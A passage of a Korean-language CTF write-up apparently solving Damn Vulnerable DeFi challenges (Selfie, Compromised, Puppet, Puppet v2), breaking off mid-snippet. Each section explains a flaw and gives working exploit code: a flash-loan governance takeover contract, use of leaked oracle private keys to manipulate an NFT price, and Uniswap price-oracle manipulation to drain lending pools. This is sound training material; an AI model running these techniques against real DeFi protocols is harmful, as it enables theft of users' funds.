</span><span style="color:#75715e"> * @param actionId 실행할 작업의 식별자(actionId)
</span><span style="color:#75715e"> */</span>
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">executeAction</span>(<span style="color:#66d9ef">uint256</span> actionId) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {
    <span style="color:#75715e">// _canBeExecuted()에 의해 (1) 아직 실행된 적이 없고(executedAt==0), (2) 큐에 적재된지 2일 이상이 지난 작업만 실행 가능
</span><span style="color:#75715e"></span>    require(_canBeExecuted(actionId), <span style="color:#e6db74">&#34;Cannot execute this action&#34;</span>);
    
    GovernanceAction <span style="color:#66d9ef">storage</span> actionToExecute <span style="color:#f92672">=</span> actions[actionId];
    actionToExecute.executedAt <span style="color:#f92672">=</span> block.timestamp;

    actionToExecute.receiver.functionCallWithValue(
        actionToExecute.data,           <span style="color:#75715e">// address target
</span><span style="color:#75715e"></span>        actionToExecute.weiAmount       <span style="color:#75715e">// bytes memory data
</span><span style="color:#75715e"></span>    );

    emit ActionExecuted(actionId, msg.sender);
}
</code></pre></div><p>해당 거버넌스 메커니즘은 총 200만개가 발행된 DTV 토큰 중에서, 100만개를 초과한 토큰을 가진 계정만이 Lending Pool을 제어할 수 있는 action을 queue에 삽입할 수 있다.</p>
<p>Flash Loan으로부터 150만개의 토큰(총 발행량의 과반이 넘는 토큰양)을 대출한 뒤, 거버넌스 큐에 drainAllFunds() 함수를 실행하는 action을 삽입한다.</p>
<p>이후 queue에 있는 action을 실행하여 Lending Pool의 모든 토큰을 공격자의 계정으로 옮길 수 있다.</p>
<h3 id="exploit-5">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-5">#</a></h3>
<p><strong>attacker-contracts/FlashLoanSelfie.sol</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;

<span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;@openzeppelin/contracts/utils/Address.sol&#34;</span>;

<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IDamnValuableToken</span> {
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transfer</span>(<span style="color:#66d9ef">address</span> recipient, <span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span>;
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transferFrom</span>(<span style="color:#66d9ef">address</span> sender, <span style="color:#66d9ef">address</span> recipient, <span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span>;
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">approve</span>(<span style="color:#66d9ef">address</span> spender, <span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span>;
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#66d9ef">address</span> account) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>);
}

<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IDamnValuableTokenSnapshot</span> {

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">snapshot</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>);

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getBalanceAtLastSnapshot</span>(<span style="color:#66d9ef">address</span> account) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>);

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getTotalSupplyAtLastSnapshot</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>);
}

<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">ISimpleGovernance</span> {
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">queueAction</span>(<span style="color:#66d9ef">address</span> receiver, <span style="color:#66d9ef">bytes</span> calldata data, <span style="color:#66d9ef">uint256</span> weiAmount) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>);
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">executeAction</span>(<span style="color:#66d9ef">uint256</span> actionId) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span>;
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getActionDelay</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>);
}

<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">ISelfiePool</span> {
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flashLoan</span>(<span style="color:#66d9ef">uint256</span> borrowAmount) <span style="color:#66d9ef">external</span>;
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">drainAllFunds</span>(<span style="color:#66d9ef">address</span> receiver) <span style="color:#66d9ef">external</span>;
}


<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">FlashLoanSelfie</span> {
    <span style="color:#f92672">using</span> Address <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span>;

    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">public</span> attacker;
    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">public</span> token;
    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">public</span> governance;
    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">public</span> lenderPool;
    
    <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">public</span> actId;

    <span style="color:#66d9ef">constructor</span> (<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _attacker, <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _token, <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _governance, <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _lenderPool) {
        attacker <span style="color:#f92672">=</span> _attacker;
        token <span style="color:#f92672">=</span> _token;
        governance <span style="color:#f92672">=</span> _governance;
        lenderPool <span style="color:#f92672">=</span> _lenderPool;
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">receiveTokens</span>(<span style="color:#66d9ef">address</span> _tokenAddress, <span style="color:#66d9ef">uint256</span> _borrowAmount) <span style="color:#66d9ef">external</span> {
        <span style="color:#75715e">// Flash loan borrow
</span><span style="color:#75715e"></span>       
        IDamnValuableTokenSnapshot(_tokenAddress).snapshot();

        actId <span style="color:#f92672">=</span> ISimpleGovernance(governance).queueAction(lenderPool, abi.encodeWithSignature(<span style="color:#e6db74">&#34;drainAllFunds(address)&#34;</span>, attacker), <span style="color:#ae81ff">1</span>);
        
        <span style="color:#75715e">// Flash loan repayment : pay back to flash loan
</span><span style="color:#75715e"></span>        IDamnValuableToken(_tokenAddress).transfer(lenderPool, _borrowAmount);
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">executeFlashLoans</span>(<span style="color:#66d9ef">uint256</span> _amount) <span style="color:#66d9ef">external</span> {
        ISelfiePool(lenderPool).flashLoan(_amount);
    }

    receive() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {}
}
</code></pre></div><p><strong>selfie.challenge.js</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">FlashLoanSelfieFactory</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">getContractFactory</span>(<span style="color:#e6db74">&#39;FlashLoanSelfie&#39;</span>, <span style="color:#a6e22e">attacker</span>);
<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">exploit</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">FlashLoanSelfieFactory</span>.<span style="color:#a6e22e">deploy</span>(<span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">address</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">governance</span>.<span style="color:#a6e22e">address</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pool</span>.<span style="color:#a6e22e">address</span>);

<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">exploit</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">executeFlashLoans</span>(<span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;1500000&#34;</span>));

<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">provider</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;evm_increaseTime&#34;</span>, [<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span>]); <span style="color:#75715e">// 2 days
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">governance</span>.<span style="color:#a6e22e">executeAction</span>(<span style="color:#ae81ff">0</span>);
</code></pre></div><hr>
<h2 id="-7-compromised"># 7. Compromised<a hidden class="anchor" aria-hidden="true" href="#-7-compromised">#</a></h2>
<h3 id="summary-6">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-6">#</a></h3>
<p>&ldquo;DVNFT&quot;라는 NFT를 거래하는 마켓이 있으며, 해당 NFT는 개당 999 ETH에 판매되고 있다.</p>
<p>NFT의 판매 가격은 3개의 Trusted Reporter가 설정한 가격의 median 값을 사용하고 있다.</p>
<p>NFT 마켓은 9990 ETH, 공격자는 0.1 ETH를 보유하고 있는 상황에서 마켓이 가진 모든 ETH를 가져오는 것이 목표이다.</p>
<p>해당 마켓으로부터 다음과 같은 on-chain 데이터가 유출되었다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
</code></pre></div><p>유출된 두개의 데이터는 2개의 Trusted Reporter 계정의 개인키(Private Key)이므로, 해당 개인키를 이용해 NFT 마켓의 NFT 가격을 낮게 설정하는 트랜잭션을 송신함으로써 시세 조작이 가능하다.</p>
<pre tabindex="0"><code>// TrustfulOracle.sol
...
function _computeMedianPrice(string memory symbol) private view returns (uint256) {
    uint256[] memory prices = _sort(getAllPricesForSymbol(symbol));

    // calculate median price
    if (prices.length % 2 == 0) {
        uint256 leftPrice = prices[(prices.length / 2) - 1];
        uint256 rightPrice = prices[prices.length / 2];
        return (leftPrice + rightPrice) / 2;
    } else {
        return prices[prices.length / 2];
    }
}
...
</code></pre><p>Trusted Reporter가 설정한 가격이 홀수인 경우 <code>prices[prices.length / 2]</code>와 같이 median price를 계산한다.</p>
<p>공격자는 3개중 2개의 개인키를 가지고 있기 때문에, 원하는대로 median price를 조작하는 것이 가능하다.</p>
<h3 id="exploit-6">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-6">#</a></h3>
<p><strong>compromised.challenge.js</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#75715e">// load wallet/signer from Private Key
</span><span style="color:#75715e"></span>
<span style="color:#75715e">// Leaked Hex Data -&gt; Base64Decode
</span><span style="color:#75715e">// 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
</span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">privKey1</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9&#34;</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wallet1</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">Wallet</span>(<span style="color:#a6e22e">privKey1</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">provider</span>);

<span style="color:#75715e">// 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
</span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">privKey2</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48&#34;</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wallet2</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">Wallet</span>(<span style="color:#a6e22e">privKey2</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">provider</span>);

<span style="color:#75715e">// Makret Manipulation (Price to low)
</span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">oracle</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">wallet1</span>).<span style="color:#a6e22e">postPrice</span>(<span style="color:#e6db74">&#34;DVNFT&#34;</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;0.01&#34;</span>));
<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">oracle</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">wallet2</span>).<span style="color:#a6e22e">postPrice</span>(<span style="color:#e6db74">&#34;DVNFT&#34;</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;0.01&#34;</span>));

<span style="color:#75715e">// buy
</span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">exchange</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">buyOne</span>({<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;0.01&#34;</span>)});

<span style="color:#75715e">// Makret Manipulation (Price to high)
</span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">oracle</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">wallet1</span>).<span style="color:#a6e22e">postPrice</span>(<span style="color:#e6db74">&#34;DVNFT&#34;</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;9990.01&#34;</span>));
<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">oracle</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">wallet2</span>).<span style="color:#a6e22e">postPrice</span>(<span style="color:#e6db74">&#34;DVNFT&#34;</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;9990.01&#34;</span>));
<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">oracle</span>.<span style="color:#a6e22e">getAllPricesForSymbol</span>(<span style="color:#e6db74">&#34;DVNFT&#34;</span>));
<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">oracle</span>.<span style="color:#a6e22e">getMedianPrice</span>(<span style="color:#e6db74">&#34;DVNFT&#34;</span>));

<span style="color:#75715e">// approve &amp; sell
</span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">nftToken</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">approve</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">exchange</span>.<span style="color:#a6e22e">address</span>, <span style="color:#ae81ff">0</span>);
<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">exchange</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">sellOne</span>(<span style="color:#ae81ff">0</span>);

<span style="color:#75715e">// price recovery
</span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">oracle</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">wallet1</span>).<span style="color:#a6e22e">postPrice</span>(<span style="color:#e6db74">&#34;DVNFT&#34;</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;999&#34;</span>));
<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">oracle</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">wallet2</span>).<span style="color:#a6e22e">postPrice</span>(<span style="color:#e6db74">&#34;DVNFT&#34;</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;999&#34;</span>));
</code></pre></div><hr>
<h2 id="-8-puppet"># 8. Puppet<a hidden class="anchor" aria-hidden="true" href="#-8-puppet">#</a></h2>
<h3 id="summary-7">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-7">#</a></h3>
<p>100,000 DTV 토큰을 보유한 Lending Pool로부터 모든 토큰을 가져오는 것이 목표이며, 공격자는 25 ETH / 1,000 DTV를 가지고 있는 상태로 시작한다.</p>
<p>Uniswap V1을 기반으로 구축된 Puppet Pool DEX(DEcentralized eXchange)가 있으며, 10 DTV / 10 ETH 의 초기 유동성이 공급되고 있다.</p>
<p>100,000 DTV 토큰을 보유하고 담보 대출을 해주는 Lending Pool이 있으며, Uniswap V1의 AMM(CPMM, Constants Product Market Maker)을 Price Oracle로 사용하고 있다.</p>
<ul>
<li>정확히는 Uniswap V1에서 받아오는 Price Oracle의 x2 가격을 담보로 설정하여 DTV 토큰을 대출해준다.</li>
<li>초기 Uniswap V1의 유동성은 10 DTV / 10 ETH이기 때문에, CPMM에 의해 Price Oracle은 1이며, Lending Pool로부터 1 DTV를 대출하려면 2 ETH를 담보로 전송해야 한다.</li>
</ul>
<p>공격자는 자신이 가진 DTV를 Uniswap V1 Pool에 있는 ETH와 Swap하여 Price Oracle 즉 DTV 토큰의 상대적인 가격을 임의로 낮출 수 있다. (1 DTV 당 대출에 필요한 ETH 가격이 낮아짐)</p>
<blockquote>
<p>CPMM 기반 Uniswap V1 Pool에 충분한 유동성이 공급되지 않는 경우, 토큰의 가격을 조작할 수 있다. (안정적인 가격 유지를 위해 충분한 유동성이 공급되어야 한다.)</p>
</blockquote>
<h3 id="exploit-7">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-7">#</a></h3>
<p><strong>puppet.challenge.js</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">approve</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">uniswapExchange</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;990&#34;</span>));

<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">uniswapExchange</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">tokenToEthTransferInput</span>(<span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;990&#34;</span>), <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;1&#34;</span>), (<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">provider</span>.<span style="color:#a6e22e">getBlock</span>(<span style="color:#e6db74">&#39;latest&#39;</span>)).<span style="color:#a6e22e">timestamp</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>, <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>);

<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">priceOracle</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">BigNumber</span>.<span style="color:#a6e22e">from</span>(<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">lendingPool</span>.<span style="color:#a6e22e">calculateDepositRequired</span>(<span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;1&#34;</span>)));
<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">numOfEths</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">priceOracle</span>.<span style="color:#a6e22e">mul</span>(<span style="color:#ae81ff">100000</span>).<span style="color:#a6e22e">add</span>(<span style="color:#ae81ff">1</span>);

<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">lendingPool</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">borrow</span>(<span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;100000&#34;</span>), {<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">numOfEths</span>});
</code></pre></div><hr>
<h2 id="-9-puppet-v2"># 9. Puppet v2<a hidden class="anchor" aria-hidden="true" href="#-9-puppet-v2">#</a></h2>
<h3 id="summary-8">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-8">#</a></h3>
<p>Puppet과 동일하게 적은 유동성에 따른 토큰 가격 조작에 대한 위험이 있으며, Uniswap V2 업데이트에 따른 인터페이스(Wrapped ETH, Swap Router Path 등)만 맞춰주면 된다.</p>
<h3 id="exploit-8">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-8">#</a></h3>
<p><strong>puppet-v2.challenge.js</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#75715e">// Swap DTV -&gt; ETH
</span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">stamp</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">provider</span>.<span style="color:#a6e22e">getBlock</span>(<span style="color:#e6db74">&#39;latest&#39;</span>)).<span style="color:#a6e22e">timestamp</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>;
<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">approve</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">uniswapRouter</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;9999&#34;</span>));
<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">uniswapRouter</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">swapExactTokensForETH</span>(<span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;9999&#34;</span>), <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;1&#34;</span>), [<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">address</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">weth</span>.<span style="color:#a6e22e">address</span>], <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">stamp</span>);

<span style="color:#75715e">// lending!
</span><span style="color:#75715e">// attacker eth -&gt; weth convert
</span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">priceOracle</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">BigNumber</span>.<span style="color:#a6e22e">from</span>(<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">lendingPool</span>.<span style="color:#a6e22e">calculateDepositOfWETHRequired</span>(<span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;1&#34;</span>)));
<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">numOfWeths</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">priceOracle</span>.<span style="color:#a6e22e">mul</span>(<span style="color:#ae81ff">1000001</span>)
<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">weth</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">deposit</span>({<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">numOfWeths</span>});
<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">weth</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">approve</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">lendingPool</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">numOfWeths</span>);

<span style="color:#75715e">// steal!
